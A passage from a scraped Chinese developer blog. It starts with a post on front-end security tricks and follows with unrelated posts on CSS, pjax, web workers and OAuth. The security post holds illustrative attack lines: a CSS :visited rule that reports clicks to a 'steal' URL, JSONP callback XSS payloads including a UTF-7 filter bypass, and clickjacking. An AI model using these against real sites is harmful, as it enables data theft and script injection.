2.2.x多个版本内，如果引发400(Bad Requerst)错误，会返回出错的请求头内容，这就包含了HttpOnly Cookie。因此，我们可以利用这个漏洞，构造一个超长的请求，让Apache返回400，并用ajax捕获xhr.responseText即可获得HttpOnly Cookie信息。 三、删不掉的本地存储如果把浏览器理解为一个器官，把恶意标志比方做寄生虫。这标志通过某种途径寄生在了浏览器，并且”永久”寄生，这想想都很可怕。这个标志，可能是植入广告的跟踪标志，或者有其他用处，总之它依附到你的浏览器就删不掉了。但它是如何寄生的呢？又如何做到“永久”？这就涉及到本地存储安全。我们先看下常规的本地存储方案： Cookie - 是最常见的方式，key-value 模式UserData - IE自己的本地存储，key-value 模式localStorage - HTML5 新增的本地存储，key-value 模式local Database - HTML5 新增的浏览器本地DataBase，是SQLite 数据库Flash Cookie Flash 的本地共享对象（LSO），key-value 模式，跨浏览器 除去这些，我还收集了一些比较“偏门”的存储方案： Silverlight的IsolatedStorage - 类似HTML5 localStoragePNG Cache，将Cookie 转换成RGB 值描述形式，以PNG Cache 方式强制缓存着，读入则以HTML5 的canvas 对象读取并还原为原来的Cookie 值HTTP Etags、Web Cache - 本质上都是利用了浏览器缓存机制：浏览器会优先从本地读取缓存的内容Web History，利用的是“CSS 判断目标URL 是否访问过”技巧，比如a标签访问过会显示紫色（新浏览器已fix）window.name，本质就是一个DOM 存储，并不存在本地。 老外Samy Kamkar用半天开发了一个JavaScript API：evercookie。该API利用了上面的全部存储手段，将“永不丢失你的cookie”贯彻到底…当evercookie发现用某种机制存储的cookie被数据将删除之后，它将利用其它机制创建的cookie数据来重新创建，让用户几乎不可能删除cookie。 四、函数覆写监听上报覆写函数，可以用于防范？这是网上安全论坛中有人提到的一个偏门要点。其缘由是：搞跨站的人总习惯用alert来确认是否已成功跨站，如果你要监控是否有人在测试你的网站xss的话，可以在你要监控的页面里覆写alert函数，记录alert调用情况。12345678910function log(s) &#123; var img = new Image(); img.src = &quot;http://yousite.com/log.php?caller=&quot; + encodeURIComponent(s);&#125;var _alert = alert;window.alert = function(s) &#123; log(alert.caller); _alert(s);&#125;如此，就能在有人调用alert时，就执行上报，以供监控。好吧，这里还涉及人的心理学…其实函数覆写无论攻还是防，都应该是我们关注的一个点。相关文章：《浅谈javascript函数劫持》。 五、内存Cookie与硬盘Cookie内存Cookie - 指没有设置过期时间Expires的Cookie，随浏览器关闭，此Cookie在内存中销毁硬盘Cookie - 设置了过期事件Expires的Cookie，常驻硬盘，直到过期 我们很容易得出结论：内存Cookie更安全。因此，某些站点会把敏感信息放到内存Cookie里面。这原本是没什么风险的，但恰巧会在遇到XSS的时候失控。试想下，XSS攻击者可以给内存Cookie加一个过期时间，使其变为硬盘Cookie，就会在未来很长一段时间内，甚至是永久控制着目标用户的账号权限。 因此，这里有两个关注点： 敏感信息还是不要放Cookie里，即使是内存Cookie； 服务器要做Cookie的三个维度的校验 - 唯一性（是否验证通过）、完整性（是否被篡改了）、是否过期。 六、CSS带来的点击量泄露在我们的印象中，前端安全基本是js带来的问题，但css也会有安全隐患吗？是的。除去IE下的css中执行js代码问题，还有另外一个关注点。假如有一个开源组件，我们只看了下js源码，觉得没有漏洞风险，就直接拿过来使用了。况且，没有前端人员乐于去读别人的css的…但有某种极端的情况，css带来了意想不到的数据泄露。试想这是一个导航栏组件，html代码是这样的：123&lt;a href=&quot;http://yousite.com/a1&quot; id=&quot;a1&quot;&gt;nav1&lt;/a&gt;&lt;a href=&quot;http://yousite.com/a2&quot; id=&quot;a2&quot;&gt;nav2&lt;/a&gt;&lt;a href=&quot;http://yousite.com/a3&quot; id=&quot;a3&quot;&gt;nav3&lt;/a&gt;你忽略掉的css写成这样：123#a1:visited &#123;background: url(http://report.com/steal?data=a1);&#125;#a2:visited &#123;background: url(http://report.com/steal?data=a2);&#125;#a3:visited &#123;background: url(http://report.com/steal?data=a3);&#125;我们用到业务里，用户点击这三个导航后，a标签的visited伪属性生效，就会设置background，而背景的url其实是上报地址。这时候，你的业务的点击数据量就暴露给第三方了！当然，这只针对旧版本浏览器，新版本浏览器都已fix这个问题。可是，HTML5的出现又让这个问题回归了…HTML5提供伪类::selection，当指定对象区域被选择时，就会触发。其原理跟上面类似。 七、JSONP回调函数与UTF-7编码7.1) 基本原理在JSONP技术中，服务器通常会让请求方在请求参数中提供callback 函数名，而不是由数据提供方定制，如请求方发起请求：cgi-bin/get_jsonp?id=123&amp;call_back=some_function返回数据格式为：some_function([&#123;&#39;id&#39;:123, data:&#39;some_data&#39;&#125;]);如果，数据提供方没有对callback函数名做安全过滤，就会带来XSS问题。请求：cgi-bin/get_jsonp?id=123&amp;call_back=&lt;script&gt;alert(1);&lt;/script&gt;返回：&lt;script&gt;alert(1);&lt;/script&gt;([&#123;&#39;id&#39;:123, data:&#39;some_data&#39;&#125;]);所以，一般服务器都会对call_back参数进行过滤，但过滤的方法是否会存在漏洞呢？ 7.2) IE解析UTF-7漏洞比较简单的过滤方法，是过滤&lt;&gt;字符，使得无法构成html标签。但在IE6\\IE7的某些版本中，存在以下漏洞：如果发现文件前面是“+/v8”开头，就把文件当做UTF-7解析（IE7后续版本已发布补丁修复）。在没被修复的IE版本中，如果我们将上面的请求用utf-7编码。再在前面加上”+/v8”头：cgi-bin/get_jsonp?id=123&amp;callback=%2B%2Fv8%20%2BADw-script%2BAD4-alert(1)%2BADw-%2Fscript%2BAD4这时候巧妙的躲开了&lt;&gt;过滤，而返回：+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4(&#123;‘id’=&gt;123,data=&gt;’some_data’&#125;);这时IE将这个jsonp文件当作utf-7解析，依然触发XSS。 八、过滤与代码混淆过滤器如果过滤了大部分的js函数，如eval、alert之类，是否就能保证安全呢？必然不是，我们还有强大的js代码混淆手段，可以绕过过滤器。这里推荐一个神奇的网站：jsfuck。站名如其名，满满的恶意…它可以仅仅用6个字符：[]()!+去混淆编码js。而且兼容性特别的完善。以下是我在最新chrome下的截图，将一句alert(1)编码成了3009个字符，并执行成功：所以过滤器仅仅通过适配关键函数名，是不能保证安全性的。 九、心理学与社会工程学有个观点认为“一切钓鱼网站成功案例，都是一次心理学的实战演练”。在这个层面，可谓五花八门，创意百出。分享两个案例： 9.1）诱导触发拖拽事件比方说，有某已知漏洞，要用户触发拖拽事件才能触发。怎么搞定这个事情呢？很简单，添加一张图片：注意这是一张图片，滚动条是图片的一部分而不是真正的浏览器控件，用户自然会去下拉“滚动条”，因而触发了这个漏洞。 9.2) 传说中的QQ空间“传染病毒”步骤是这样的： A(始作俑者)发布了一条说说：这个网站很好玩，快来试试吧~ http://xxx.xxx A的好友们看到了，打开了这个链接，玩了一下后，就关闭了页面 好友们不知道，竟然自己的空间主动转发了这条说说（问题是自己没有点转发呀！） 一传十十传百，越传越广… 但真实的情况跟CSRF没一点关系。玄妙在于：好友们打开链接后干了什么事情？这个网站是一个小球在跳来跳去，网站上有一句话：你能点到我吗？用户看到后，就很想去点击小球，看会发生什么；但点击后，就转发了说说… 有人会问，这不是CSRF吗？还真不是。做法却很简单：“有趣”的网站内嵌了一个iframe，iframe加载的是这条说说的原页面，然后把“转发”按钮刚好放到小球的位置上，再把这iframe的透明度变为0。所以用户点击小球，其实是点击了iframe中的转发按钮。真是令人万万没想到。 以上。End. 5.27 by litten.","tags":[{"name":"web","slug":"web","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/web/"}]},{"title":"小朋友，跟你谈谈印象派","date":"2014-03-30T15:52:00.000Z","path":"2014/03/30/volunteer-activities/","text":"今天去陪留守的小朋友一起画画，这是一个义工志愿者活动。 经游戏分组，我负责带5位小朋友，正巧是三胞胎和双胞胎。杜晓凡、杜晓平、杜德俊（水饺）三兄妹，文殊琪、文殊曼（馒头）姐妹。混淆了好几次谁是馒头，谁是水饺后，我已经记住你们的名字了。 小朋友们都不认生，晓凡一开始就问我好多问题。比如这些： 晓凡：哥哥你几年级？我：我已经上班了。晓凡：不会吧？看不出来哎。你在哪里上班？我：腾讯。晓凡：原来是挺随便找了个公司我：……对 水饺是个小胖子，有很多个花名。其中一个叫做豆子，但现在不许我们这么叫他，因为他说自己已经长大了，豆子太小就改名成水饺了。水饺热衷于怪兽图…他的太阳都是有手脚的。他用短短时间画了两张“百兽图”，还会问我：哥哥我要你手机，你有天天酷跑吗，我要画里面有个怪兽。 馒头是我带的小朋友里面绘画思维最好的一位。她想着画羊，还会借我的手机，自己去搜索图片去模仿。很聪明的小女孩。 妹妹殊琪却比较胆小，总怕出错，跟姐姐完全不一样。她喜欢让我帮忙出谋划策，却不敢自己大胆去涂画，直到最后她还没敢涂色。 晓平比晓凡小5岁，是个扎着双马尾很可爱的小朋友，有需要也会主动问我，但从不要求我插手，只凭自己感觉去画画，这点超赞。 雅典娜小朋友的作品是在场很少的，能传达出意义的画作。看不出是个二年级学生的作品。聪慧美丽的小女孩人如其名。 讲解印象派水彩的时候，老师问，谁能看出这幅画与前面的画的区别。我脑中尽是高深详细的“印象派”词义描述，有不确定的点，再拿出手机百度一翻，最后成竹在胸，了然于心。 后面一小朋友大声喊：看不清！老师：对的，这就是印象派的特征。 有时我们顾于去搜寻最客观的解释，企图用权威的释义去描述事务，却不能像小朋友一样，忠实于自己的眼睛。也许，他们真的比我们懂更多所谓的“印象派”，不是么？","tags":[{"name":"生活","slug":"生活","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E7%94%9F%E6%B4%BB/"},{"name":"旧事","slug":"旧事","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E6%97%A7%E4%BA%8B/"}]},{"title":"instagram图片拉取小经验","date":"2014-03-03T14:52:00.000Z","path":"2014/03/03/instagram-api-ex/","text":"最近喜欢上了instagram，分享一下获取照片的经验。 一、三“步”曲instagram开放了API，授权遵循Oauth2.0协议。 1、注册client id到管理客户端页面，选择“注册新客户端”。这时会提示你填手机号，接着会收到短信验证码。经过验证，就到达了下面的界面：按照字面意思填写完毕，client id就注册完毕了。 2、用client_id去换取token在浏览器中请求：1https://instagram.com/oauth/authorize/?client_id=&#123;CLIENT_ID&#125;&amp;redirect_uri=&#123;REDIRECT_URI&#125;&amp;response_type=token花括号里面的值，对应上一步最终得到的client_id和自己设定的redirect_uri。请求到的是一个授权页面，授权完毕后，则重定向到你的redirect_uri。注意看授权成功后的url，hash部分会附带给你的token。至此，token成功获取。 3、用token去调用API拿到token，就等于拿到仓库的钥匙了！赶紧试着用token调用api查看自己的图片吧：1https://api.instagram.com/v1/users/&#123;USER_ID&#125;/media/recent/?access_token=&#123;TOKEN&#125;这时，你会发现似乎…被instagram api坑了一道。user_id是个啥？机智如我，果断填上了自己的用户名。结果错了。 后来发现有这个的网站：lookup-user-id，通过此业界良心，成功获取到user_id，摆平了上面的请求。 二、参考 更多功能可参考api文档 如果想了解Oauth授权，点此 三、再说两句图片分享的网站万万千，instagram却只有一个。我不是此产品的脑残粉，只是觉得社区氛围这种东西，可意会而不可言传，它是社交产品的灵魂。不是每个功能相近的产品都能营造的。 事实上，instagram有很多限制，或者大家称之“功能不完善”的地方。比如，在pc上浏览网站，居然不能发图片，不能看自己关注的人，或者有哪些粉丝。这都限制死了，何以称为社交？但换个角度来想，这样就“强迫”用户去用手机操作instagram，因为产品最想想表达的，就是用摄影去快速记录生活，而已。 不用拓展业务的噱头去损坏产品的思想表达，不刻意向老板汇报我们新增了多少用户量。 “你想做什么，你就会进入什么样的圈子”，这句话，不单单是对用户而言，每个创造者心中都应有这样的思考。 the end.litten 2014.3.3","tags":[{"name":"web","slug":"web","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/web/"},{"name":"经验","slug":"经验","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E7%BB%8F%E9%AA%8C/"},{"name":"产品","slug":"产品","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E4%BA%A7%E5%93%81/"}]},{"title":"像素级细节：移动端1px border的实现","date":"2014-02-22T12:11:00.000Z","path":"2014/02/22/thinner-than-1px-border/","text":"请记住，每个尽责的设计师都是处女座… 这里…没有黑处女座的意思，只是想借题发挥，并由衷的跪倒在强大的“像素眼”之下。 一、你是我的眼什么是像素眼？就是那些个神奇的存在，他们用余光瞄了你一眼，然后跟你说：我发现啊，你左边眉毛比右边眉毛高了1像素，麻烦你调整下… 在腾讯，我身边的许多设计同学都有这样的眼睛。他们会把细节做到极致，也会因为频繁的修改，把你开发的心情搞得一团糟。但你得承认，他们是对的。 最近在做移动端web开发，按着设计图，toby已在我旁边核对修改了两个多小时。当我觉得已经万事大吉时，toby跟我说，还是觉得不太对——边框好像有点粗？ 当时我就傻眼了，因为这已是最细的边框，电脑上清楚的显示，我已经设置了1px的border。于是我去解释，并建议更换个色值，让边框至少“看起来”更细。而toby却不接受，按他给我的说法是：这border看起来不性感… 原来这世界的审美观，都是以瘦为美，从女人到一根线？于是乎，为了寻找性感的border，搜集一堆资料后还真找到了方案： 父元素设置：scale(0.5,0.5) 子元素设置：scale(2,2) 还原缩放，origin都是基于左上角（0,0）/left top 这样父元素的border其实被缩放了，无疑更细。 二、通用方案用一个css类去为block元素添加更细的border1234567891011121314151617.border-1px&#123; position: relative; &amp;:before, &amp;:after&#123; border-top: 1px solid #c8c7cc; content: &#x27; &#x27;; display: block; width: 100%; position: absolute; left: 0; &#125; &amp;:before&#123; top: 0; &#125; &amp;:after&#123; bottom: 0; &#125;&#125;适应移动设备：123456789101112131415161718192021@media (-webkit-min-device-pixel-ratio:1.5), (min-device-pixel-ratio: 1.5)&#123; .border-1px&#123; &amp;::after, &amp;::before&#123; -webkit-transform: scaleY(.7); -webkit-transform-origin: 0 0; transform: scaleY(.7); &#125; &amp;::after&#123; -webkit-transform-origin: left bottom; &#125; &#125;&#125;@media (-webkit-min-device-pixel-ratio:2), (min-device-pixel-ratio: 2)&#123; .border-1px&#123; &amp;::after, &amp;::before&#123; -webkit-transform: scaleY(.5); transform: scaleY(.5); &#125; &#125;&#125; 三、来个对比比如，之前我学日语时，自己搞起了个app，这是50音列表界面，可以明显的看出区别：上图是原生方案，下图是…性感方案 源码小demo，注意要在手机上才能看到效果：demo。 The End.——litten 2.22 “写轮眼？弱爆了啊 ←_←”","tags":[{"name":"html","slug":"html","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/html/"},{"name":"css3","slug":"css3","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/css3/"}]},{"title":"pjax: 当ajax遇上pushState","date":"2014-02-12T00:55:00.000Z","path":"2014/02/12/about-pjax/","text":"var pjax = pushState + ajax;小时候，小浣熊方便面里面有各种水浒人物的卡片。我买了一包，吃了方便面，饱了。而我又买了第二包，不是想吃方便面，而是仅仅想得到里面的卡片… 一、简介pushState是html5中提供的方法，用以 无刷新的更新浏览器地址栏； 如其名称，将新地址push到历史堆栈中 用法：pushState(data, title ,url) data为保存的对象，可以在window.onpopstate时获取到；title为页面标题；url为需地址栏和历史发生改变的url。正是这点看似很平常的功能，跟ajax结合到一起产生了火花。因为，ajax最擅长的事情就是局部刷新页面。 二、ajax的纠结历史一切可以从ajax最擅长的事情说起。ajax作为一个异步请求模型，从最初设计开始，也许压根就没打算将它跟浏览器历史挂钩。原因是历史堆栈所记录的，某种意思上可以说是顺序，跟我们理解的“同步”更为密切。 因而，ajax可以无刷新改变页面内容，却无法改变页面的url。 历史问题1 - 如何操控历史 当单页面越来越流行，操作记录却很容易被忽略。假设有这样的单页面，按照分类点击，界面逐层递进：体育 - 篮球 -nba -马刺队 - 邓肯当我们点了4下到“邓肯”界面时，一个不小心的刷新，出现在你面前的也许是“体育”。原因是操作记录没有被记录。而通常的解决方案是修改hash，每递进一层，去更新url的hash值，这样的方法： 刷新时预先判断url的hash，从而知道这是哪一层，加载相应数据； 支持了历史 这样的方式貌似比较完善，其实不然。 历史问题2 - 对搜索引擎不友好 最大的问题是，hash后生成的内容是不会被搜索引擎引用到。数据不能被爬取，无疑是浪费和损失。因此google放言，咱可以约定个协议：#!xxx这样hash的url，google也去爬取。称之为hash bang（哈希大爆炸？）。这一协议，在g+，twitter，人人，新浪微博上都可以看到。 事实上，ajax最或缺的两个问题，恰好被pushState的功能补充完善。 三、pjax带来的价值除去补齐了ajax的问题，我们发现pjax会给web带来更多的好处。回到开始说的“两包方便面”，我的意思是，有时你访问两个url，部分数据是相同的。比如百度贴吧，第一页和第二页的区别只是帖子内容（卡片）的不同，网站外框部分（方便面）都是一样的，这些东西就不需要在页面刷新时重复加载。 ajax处理这样的局部刷新，已经给我们带来了web2.0的体验，而加上pushstate的ajax则更进一步： 一个url对应一套数据，有利于SEO； 更改数据和url时，只是局部刷新，带来较好的用户体验； 兼容性好，对不支持pushstate的浏览器，url也能正常请求页面（虽然有重复加载）； 刷新页面时，由于是url唯一，能正常加载到用户希望看到的数据，比处理hash的方式更方便； 后退与前进的浏览器操作，依然可以局部刷新（通过onpushstate事件捕获） 四、注意事项然而pjax不等于单纯的分离使用pushstate与ajax，还必须得做一些封装。缘于以下我能想到的注意事项： 服务器端增加额外处理逻辑服务器端，需要根据请求的参数，作出全页渲染或局部渲染响应 1234567Accept:text/html, */*; q=0.01Accept-Encoding:gzip,deflate,sdchConnection:keep-aliveHost:qianduannotes.duapp.comUser-Agent:AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36X-Requested-With:XMLHttpRequestX-PJAX:true 比如请求头部可以设定一个X-PAJX:true，用以通知服务器。 浏览器兼容假如浏览器不支持pushstate，提供fallback操作，直接打开需更改url的地址： 12345678$.support.pjax = window.history &amp;&amp; window.history.pushState// Fallbackif ( !$.support.pjax ) &#123; $.pjax = function( options ) &#123; window.location = $.isFunction(options.url) ? options.url() : options.url &#125; $.fn.pjax = function() &#123; return this &#125;&#125; 本地存储机制无疑pjax与localstorage共同使用可以进一步提升体验，但这一步容易忽略的是数据上报。 五、参考资料jquery-pjaxwelefen封装的pjax","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"html","slug":"html","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/html/"}]},{"title":"如何成功做出一款没人使用的产品","date":"2013-12-20T03:55:00.000Z","path":"2013/12/20/no-one-used-pro/","text":"1、 logo金属化，而且是重金属。给人朋克风范，炫酷感觉。第一眼就有被闪电晃过灵魂的错觉，这样子就对了。 2、无限循环的播放背景音乐。不需要设置关闭，你只需要坚持自我。 3、注册的界面，输入密码的文字框一般有两个：填密码和确认密码的。我们可以做5个，让他们再再确认，这样可以体现你无微不至的情怀。情怀你懂吗？ 4、注册新用户名的时，先把数据检测一下。并提示：你确定用户名不带火星文吗？用户点了否，再提示：那特殊符号也不用❤★※←＆♂吗？如果用户还是点了否，你要做出这样的符号表情来表示不理解：~&gt;_&lt;~ 5、要有“意见反馈”的功能，但是，无论用户提交了什么有价值的意见，甚至用户觉得这建议太美好了以至于自己都high了起来。一律不回。 6、给用户黑名单里面的人都发个消息：“TA给你加了黑名单我偷偷告诉你，你别告诉TA哦”。 7、安装程序时，要勾上“同意以上条款，并背诵全文”。 8、所有文案只写一半，刚引起用户兴趣就戛然而止，记住你是风一般的产品经理。 9、 The End.","tags":[{"name":"旧事","slug":"旧事","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E6%97%A7%E4%BA%8B/"},{"name":"药别停","slug":"药别停","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E8%8D%AF%E5%88%AB%E5%81%9C/"}]},{"title":"统一处理异步的js回调","date":"2013-10-06T02:55:00.000Z","path":"2013/10/06/handling-asynchronous-js/","text":"js编程时经常会用到异步处理，而异步会带了所谓的并发问题。比如，你需要向服务器发出多个ajax请求，然后在返回所有结果后做进一步处理，同时要显示动画。因此我们需要用到以下的方案。 【定义函数】定义Batch函数。参数为函数组成的数组functions，这里面的函数将稍后执行，以及这些函数完成后的回调completionHandler。1234function Batch(functions, completionHandler) &#123; this._functions = functions; this._completionHandler = completionHandler;&#125; 【启动请求】用this._remaining来记录未执行的函数量，然后执行各个函数。123456789Batch.prototype.execute = function execute() &#123; var i; var functions = this._functions; var length = this._remaining = functions.length; this._results = []; for (i = 0; i &lt; length; i += 1) &#123; functions[i](this); &#125;&#125;; 【让Batch知道函数完成】用this._results来记录执行结果，当this._remaining为0时，表示所有函数已执行完毕。123456789Batch.prototype.done = function done(result) &#123; this._remaining -= 1; if (typeof(result) !== &#x27;undefined&#x27;) &#123; this._results.push(result); &#125; if (this._remaining === 0) &#123; this._completionHandler(this._results); &#125;&#125;;到这里，就完成了Batch这个函数的简单功能了。 【使用】将Batch应用到实际上。1234567891011121314151617181920212223242526272829var urls = [ &#x27;/api/gists/1000&#x27;, &#x27;/api/gists/1001&#x27;, &#x27;/api/gists/1002&#x27;, &#x27;/api/gists/1003&#x27;, &#x27;/api/gists/1004&#x27;, // ... &#x27;/api/gists/1337&#x27;, // etc...];var i;var length = urls.length;var batchFunctions = [];// 创建需要被batch执行的函数数组for (i = 0; i &lt; length; i += 1) &#123; batchFunctions.push(function (batch) &#123; $.ajax.get(urls[i], function (response) &#123; batch.done(response); &#125;); &#125;);&#125;var myBatch = new Batch(batchFunctions, function (results) &#123; //返回各个函数的结果数组&#125;);myBatch.execute(); // 开始执行这样的方案其实是参考了“观察者”模式。相关源码推荐nodeJs的Async.js库。 THE END.","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"web","slug":"web","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/web/"}]},{"title":"web worker简易入门","date":"2013-09-25T02:55:00.000Z","path":"2013/09/25/web-worker-learning/","text":"js是单线程的语言，由于此特性，我们在处理并发时需要用到一些技巧，如setTimeout()，setInterval()，调用XMLHttpRequest等。但这里的并发只是非阻塞（参照John Resig的文章How JavaScript Timers Work），真正的多线程编程则需要HTML5的web worker。 【worker的使用】web worker的使用非常简单，线程之间通讯的api与html5 postmessage或node.js里面的socket.io方法类似。 通讯： 发送方：postMessage(data) 接收方：onmessage(event) 终止web worker: 子线程: self.close() 父线程: worker.terminate() 按照目前w3c规范，web worker分为两种：专用worker(Dedicated Worker)和共享worker(Shared Worker)。 【专用worker】实例化一个web worker对象，异步加载子线程文件worker.js，其中的代码将执行。 var worker = new Worker(&quot;worker.js&quot;); 给worker增加侦听 worker.onmessage = function (event) &#123; alert(event.data); &#125;; 在worker.js里，发送消息给父线程 postMessage(&apos;hello，imweb&apos;); 在父线程页面就能看到发送过来的信息了。 同时，在web worker标准中，是支持对象参数的，也就是说我们能够传递json数据。再看一个稍微复杂点的例子，父线程： var worker = new Worker(&quot;worker.js&quot;); worker.onmessage = function (event) &#123; document.getElementById(&quot;result&quot;).innerHTML=event.data; &#125;; function start()&#123; worker.postMessage(&#123;&apos;cmd&apos;: &apos;start&apos;, &apos;msg&apos;: &apos;start&apos;&#125;); &#125; function pause()&#123; worker.postMessage(&#123;&apos;cmd&apos;: &apos;pause&apos;, &apos;msg&apos;: &apos;pause&apos;&#125;); &#125; function stop()&#123; worker.postMessage(&#123;&apos;cmd&apos;: &apos;stop&apos;, &apos;msg&apos;: &apos;stop&apos;&#125;); &#125; function msg()&#123; worker.postMessage(&#123;&apos;msg&apos;: &apos;hello imweb&apos;&#125;); &#125; worker.js： self.onmessage = function (e) &#123; var data = e.data; switch (data.cmd) &#123; case &apos;start&apos;: taskStart(); //大量数据处理 postMessage(&apos;WORKER DO: &apos; + data.msg); break; case &apos;pause&apos;: taskPause(); postMessage(&apos;WORKER DO: &apos; + data.msg); break; case &apos;stop&apos;: postMessage(&apos;WORKER DO: &apos; + data.msg); self.close(); //终止web worker break; default: postMessage(&apos;MESSAGE: &apos; + data.msg); &#125;; &#125;; 从上面的例子可以看到，一是利用对象参数，进程之间能够较灵活的实现控制；二是当woker执行taskStart()处理大量数据时，只在子进程处理，不会给主页面带来阻塞，通常，处理大量数据会消极影响程序的响应能力，而web worker通过这样的方式，能提供一个更流畅更实时的UI。 【共享worker】共享worker允许线程在同源中的多个页面间进行共享，例如：同源中所有页面或脚本可以与同一个共享线程通信。它的实例化与事件侦听的写法与专用worker略有不同,主页面： var worker = new SharedWorker(&apos;shared-worker.js&apos;); worker.port.onmessage = function(e) &#123; msg = &apos;Someone just said &quot;&apos; + e.data.message + &apos;&quot;. That is message number &apos; + e.data.counter; console.log(msg); &#125;; worker.port.postMessage(&apos;hello shared worker!&apos;); shared-worker.js: var counter = 0; var connections = []; onconnect = function(eConn) &#123; var port = eConn.ports[0]; // 此连接的特有port //当有消息的时候通知所有的连接 port.onmessage = function(eMsg) &#123; counter++; for (var i=0; i &lt; connections.length; i++) &#123; connections[i].postMessage(&#123; message: eMsg.data, counter: counter &#125;); &#125; &#125; port.start(); connections.push(port); 用两个窗口打开这个页面，第一个显示：Someone just said “Hello shared worker!” This is message number 1，第二个也收到一样的信息，但是后面是message number 2。 【安全性和错误检查】出于安全性的考虑，web worker必须遵守同源策略。同时，它的全局对象是worker对象本身，this和self引用的都是worker对象。只能访问： navigator 对象（仅限appName, appVersion, platform, userAgent） location 对象（只读） XMLHttpRequest setTimeout(), setInterval(), clearTimeout()和clearInterval()方法 不能访问： DOM(不是线程安全的) window 对象 document 对象 parent 对象 worker内部出现错误时，可以用worker.onerror侦听到，error的事件有三个属性： filename: 发生错误的文件名 lineno: 代码行号 message: 完整的错误信息 如： worker.onerror = function(e) &#123; console.log(e.filename+&quot;ERROR on line&quot;+e.lineno+&quot;,msg:&quot;+e.message); &#125; 【web worker的其他尝试】对于比较消耗时间的操作，我们可看到web worker能够发挥它的作用。比如：大量数据排序，精确到像素的canvas计算等。而我们又知道，jsonp加载数据时，动态创建script标签，加载和执行这些过程都是阻塞式的，而web worker正好可以异步加载，这会是更快的方式吗？带着这个疑问我做了下面的试验，分别用jsonp和worker的方式去加载文件，计算数据返回时延： function tryJsonp()&#123; var d = (new Date()).valueOf(); var jsonp=document.createElement(&quot;script&quot;); jsonp.type=&quot;text/javascript&quot;; jsonp.src=&quot;worker.js?_=&quot;+d; document.getElementsByTagName(&quot;head&quot;)[0].appendChild(jsonp); jsonp.onload = jsonp.onreadystatechange = function()&#123; if(!this.readyState||this.readyState==&apos;loaded&apos;||this.readyState==&apos;complete&apos;)&#123; console.log(&apos;jsonp: &apos;+ ((new Date()).valueOf() - d)); &#125; &#125; &#125; function tryWorker()&#123; var d = (new Date()).valueOf(); var worker = new Worker(&quot;worker.js&quot;); worker.postMessage(&#123;&apos;cmd&apos;: &apos;start&apos;, &apos;msg&apos;: &apos;start&apos;&#125;); worker.onmessage = function (event) &#123; console.log(&apos;web worker: &apos;+ ((new Date()).valueOf() - d)); &#125;; &#125; 第一次加载是一份1k大小的文件，每个方法重复5次，返回结果为:第二次加载1800k大小的文件，返回结果为：可以看到对于较小的数据，jsonp还是比web worker要快，这可能是实例化worker对象时带来的影响；而数据偏大时，web worker的加载将会更优，而且它可以异步加载。 THE END.","tags":[{"name":"html","slug":"html","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/html/"},{"name":"web","slug":"web","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/web/"}]},{"title":"兔子，胡萝卜与OAuth的故事","date":"2013-08-20T04:55:00.000Z","path":"2013/08/20/oauth-rabbit/","text":"那些简单的故事，就别用复杂的方式传诵 【让我来讲几个故事吧】从前，有只老兔子，在仓库里存了一万根胡萝卜，作为给小兔子的遗产。而后他就去周游世界了。小兔子有天想去把萝卜拿出来，却被仓库外的一只兔子拦住了。一问才知道，这是老兔子安排的仓库守卫。和所有故事中的守护者一样，他正直而古板，八字眉下面有着睡眠不足的熊猫眼，世人一般称他为兔门神。兔子想要拿到萝卜，就得说服兔门神呀，于是他走了上前… 【兔子与OAuth1.0的故事】 兔子首先得证明自己是只兔子，不是狗熊也不是狼，于是他向兔门神出示了身份证 兔门神说：哦，你是只兔子。但你还得证明你是老兔子的兔崽子呀。兔子说我爸旅游去了，怎么证明呢？兔门神说，这样吧，我把你的身份证拍下来，发送给你爸，让他看下这是不是你。于是兔门神打开了微信…… 正在休假的老兔子看了下照片，回复说证件照好难看毁三观啊，但勉强认得出这货就是我儿子 兔门神确认这信息后，说，你老爸还是认你这个儿子的 兔子问，那我可以去拿胡萝卜了没？ 兔门神说，可以了，这样吧，我发你个通行证，以后拿这个来我就不用这么麻烦了。 【兔子与OAuth1.0a的故事】这种貌似天衣无缝的形式，却被一只坏兔子看出了破绽。他注意到一个细节，在最后的一步，兔门神都是习惯性的把通行证交给了面前的兔子,而不管这只兔子是不是当初的那只。于是，坏兔子趁兔门神正在和老兔子聊微信的时候，一个劲站在了兔子前面，最后兔门神居然把通行证塞给了他！这怎么可以？于是在第一步和第六步又有了修改。 兔子出示身份证的同时，也出示了自己的私房照，说，门神大哥呀，后面你记得把通行证给照片上的帅哥！ …… …… …… …… 兔门神看了下面前的兔子，私房照上的明显P过嘛但勉强认得出是本人，于是才交出了通行证 【兔子与Oauth2.0的故事】兔门神回家后，向他的老婆兔女神汇报了今天的工作，更安全的方案使他得意洋洋，没想到被兔女神骂了一顿。兔女神说，兔子证明自己还得带个身份证，你不知道在天朝办个身份证多麻烦吗？让小兔子跟老兔子去聊下微信就可以了干嘛要你插手？兔门神哑口无言，兔女神高贵冷艳的说我有四种方案，给你先说说最常用的一种吧。 兔子一开始就跟他老爸聊微信了。当然他得明确告诉老爸，他需要打开哪个仓库（因为老兔子有很多儿子，每个儿子去拿萝卜的仓库不一样，兔子要指定一下具体是哪个，问他可不可以） 老兔子回复说：“just do IT”… 